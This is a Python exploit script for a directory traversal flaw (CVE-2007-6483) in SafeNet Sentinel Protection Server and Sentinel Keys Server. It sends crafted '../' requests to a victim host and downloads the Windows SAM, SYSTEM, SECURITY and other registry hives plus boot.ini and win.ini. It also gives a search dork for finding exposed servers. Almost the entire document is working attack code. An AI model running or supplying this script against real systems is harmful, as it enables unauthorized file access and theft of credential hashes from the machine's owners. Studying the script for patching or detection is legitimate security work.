#!/usr/bin/python
#
# Exploit Title: SafeNet Sentinel Protection Server 7.0 - 7.4 and Sentinel Keys Server 1.0.3 - 1.0.4 Directory Traversal
# Date: 04/28/2014
# Exploit Author: Matt Schmidt (Syph0n)
# Vendor Homepage: http://www.safenet-inc.com/
# Software Link: http://c3.safenet-inc.com/downloads/2/1/21DAC8BE-72DE-4D32-85D4-6A1FC600581E/Sentinel%20Protection%20Installer%207.4.0.exe
# Version: SafeNet Sentinel Protection Server 7.0.0 through 7.4.0 and Sentinel Keys Server 1.0.3
# Tested on: Windows 7 and Windows XP SP2
# CVE: CVE-2007-6483
# Dork: intitle:"Sentinel Keys License Monitor"
# Greets to norsec0de

import sys, urllib2, argparse

print('\n[+] Directory Traversal Exploit')
print('[+] This script will download the registry hives, boot.ini and win.ini off the Target Windows box')
print('[+] For Windows versions other than Windows XP you will have to append the --file option and specifiy a file\n')

# Define Help Menu
if (len(sys.argv) < 2) or (sys.argv[1] == '-h') or (sys.argv[1] == '--help'):
    print('Usage:')
    print('./exploit.py --host <target> [options]')
    print('    <host>: The victim host\n')
    print('  Options:')
    print('    --port      The port the application is listening on (default: 7002)')
    print('    --file      Path to the desired remote file (ex. windows/repair/sam) without starting slash\n\n')
    sys.exit(1)

# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument('--host', required=True)
parser.add_argument('--port', type=int, default=7002)
parser.add_argument('--file')
args = parser.parse_args()

# Define Variables
host = args.host
port = args.port
if args.file is not None:
    targetFile = [args.file]
else:
    targetFile = ['windows/repair/default', 'windows/repair/sam', 'windows/repair/system', 'windows/repair/software',
                  'windows/repair/security', 'boot.ini', 'windows/win.ini']

# Send Exploit
print('[+] Sending exploit!')

# Loop for multiple files
for path in targetFile:
    # Define Directory Traversal path
    url = "http://" + host + ":" + str(port) + "/../../../../../../../../../../../../../../" + str(path)

    # Retrieve file(s)
    exploit = urllib2.urlopen(url)
    header = exploit.info()
    size = int(header.getheaders("Content-Length")[0])
    print("\n[+] Downloading: C:\%s ! Bytes: %s" % (path, size))
    filename = url.rsplit('/', 1)
    with open(str(filename[1]), "wb") as contents:
        contents.write(exploit.read())
print('\n[+] Done!\n')